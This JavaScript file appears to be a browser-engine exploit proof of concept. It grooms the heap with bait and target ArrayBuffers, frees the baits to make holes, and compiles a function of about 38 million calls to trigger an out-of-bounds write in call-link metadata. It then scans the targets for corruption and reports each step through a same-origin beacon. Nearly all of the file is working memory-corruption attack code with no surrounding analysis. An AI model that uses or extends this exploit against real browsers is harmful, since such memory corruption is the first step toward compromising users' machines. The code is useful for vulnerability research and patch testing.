// p203d — Bait-and-switch 38M metadata overflow
//
// CORRECT step order (p144 pattern):
// 1. Allocate BAITS (~100KB each) — fill heap pages
// 2. Allocate TARGETS (ArrayBuffers with sentinel) — at HIGHER addresses
// 3. FREE baits — holes at lower addresses
// 4. Compile 38M function
// 5. CALL → link() fills a bait hole with 100KB metadata buffer
// 6. OOB writes go FORWARD → hit TARGETS
//
// Target content: ArrayBuffers filled with 0x00 at CallLinkInfo pointer
// offsets (PackedRawSentinelNode = first 12 bytes per 112-byte stride),
// 0x01 elsewhere. Zeros at sentinel = "unlinked" → LLInt slow path.
//
// Beacon prefix: V203-

(function() {
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', '/beacon/V203-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch (e) {}
  }

  B('BOOT');

  // ── Step 1: BAITS ──
  // Allocate 100KB ArrayBuffers to fill marge bitfit pages.
  // These create a "bed" of 100KB allocations.
  var NBAIT = 60;
  var BAIT_SIZE = 102400; // 100KB, close to wrapped metadata size (100,096)
  var baits = new Array(NBAIT);
  for (var i = 0; i < NBAIT; i++) {
    baits[i] = new ArrayBuffer(BAIT_SIZE);
  }
  B('BAITS-' + NBAIT);

  // ── Step 2: TARGETS ──
  // These are at HIGHER addresses than baits.
  // Fill with pattern: zeros at sentinel offsets (every 112 bytes, first 12 bytes),
  // 0x01 elsewhere for detection.
  var NTARGET = 40;
  var TARGET_SIZE = 102400; // 100KB each
  var targets = new Array(NTARGET);
  for (var i = 0; i < NTARGET; i++) {
    targets[i] = new ArrayBuffer(TARGET_SIZE);
    var view = new Uint8Array(targets[i]);
    // Fill with 0x01 (non-zero baseline)
    for (var j = 0; j < TARGET_SIZE; j++) view[j] = 0x01;
    // Zero out the first 16 bytes of every 112-byte stride
    // This makes PackedRawSentinelNode (12B) + mode byte all zeros = "unlinked"
    for (var s = 0; s < TARGET_SIZE; s += 112) {
      for (var z = 0; z < 16 && (s + z) < TARGET_SIZE; z++) {
        view[s + z] = 0x00;
      }
    }
  }
  B('TARGETS-' + NTARGET);

  // ── Step 3: FREE baits ──
  // Free every other bait to create holes. Keep some for heap stability.
  var freed = 0;
  for (var i = 0; i < NBAIT; i += 2) {
    baits[i] = null;
    freed++;
  }
  B('FREED-' + freed);

  // ── Step 4: Compile the 38M function ──
  var N = 38348816;
  var CHUNK = 4000000;
  var nChunks = Math.floor(N / CHUNK);
  var rem = N - nChunks * CHUNK;
  var chunkStr = 'a();'.repeat(CHUNK);
  var parts = new Array(nChunks + 3);
  parts[0] = 'window.__fn=function(a){';
  for (var i = 0; i < nChunks; i++) parts[1 + i] = chunkStr;
  parts[nChunks + 1] = 'a();'.repeat(rem);
  parts[nChunks + 2] = '};window.__ok=1;';
  chunkStr = null;

  var blob = new Blob(parts, {type: 'application/javascript'});
  B('BLOB-' + Math.round(blob.size / 1048576) + 'MB');
  parts = null;

  var sc = document.createElement('script');
  sc.onerror = function() { B('SCRIPT-ERR'); };
  sc.onload = function() {
    B('COMPILED-' + (window.__ok ? 'OK' : 'FAIL'));
    if (!window.__ok) return;

    // Verify targets intact before call
    var preDmg = 0;
    for (var i = 0; i < NTARGET; i++) {
      var v = new Uint8Array(targets[i]);
      // Check a non-sentinel byte — should be 0x01
      if (v[16] !== 0x01 || v[17] !== 0x01) preDmg++;
    }
    B('PRE-' + preDmg);

    // ── Step 5: CALL ──
    // link() allocates metadata (100KB) → should fill a freed bait hole
    // OOB at index 894+ writes FORWARD into targets
    setTimeout(function() {
      var count = 0;
      B('CALLING');

      function cb() {
        count++;
        if (count === 1) B('CB-1');
        else if (count === 10) B('CB-10');
        else if (count === 100) B('CB-100');
        else if (count === 500) B('CB-500');
        else if (count === 893) B('CB-893');
        else if (count === 894) B('CB-894');
        else if (count === 895) B('CB-895');
        else if (count === 900) B('CB-900');
        else if (count === 1000) B('CB-1K');
        else if (count === 2000) B('CB-2K');
        // Throw after enough OOB writes to corrupt targets
        if (count > 1500) throw 'STOP';
      }

      try {
        window.__fn(cb);
        B('RET-' + count);
      } catch (e) {
        B('THREW-' + count);
      }

      // ── Step 6: Check corruption ──
      var postDmg = 0;
      var details = [];
      for (var i = 0; i < NTARGET; i++) {
        try {
          var v = new Uint8Array(targets[i]);
          var changed = 0;
          for (var j = 16; j < TARGET_SIZE; j += 112) {
            if (v[j] !== 0x01) { changed++; }
          }
          if (changed > 0) {
            postDmg++;
            if (details.length < 5) {
              // Report first corrupted offset and value
              for (var j = 0; j < TARGET_SIZE; j++) {
                if (v[j] !== (j % 112 < 16 ? 0x00 : 0x01)) {
                  details.push('T' + i + '@' + j + '=' + v[j].toString(16));
                  break;
                }
              }
            }
          }
        } catch (e) {
          postDmg++;
          details.push('T' + i + '=ERR');
        }
      }
      B('POST-' + postDmg);
      if (details.length > 0) B('HIT-' + details.join('_'));
      B('DONE');
    }, 300);
  };
  document.head.appendChild(sc);
  sc.src = URL.createObjectURL(blob);
})();
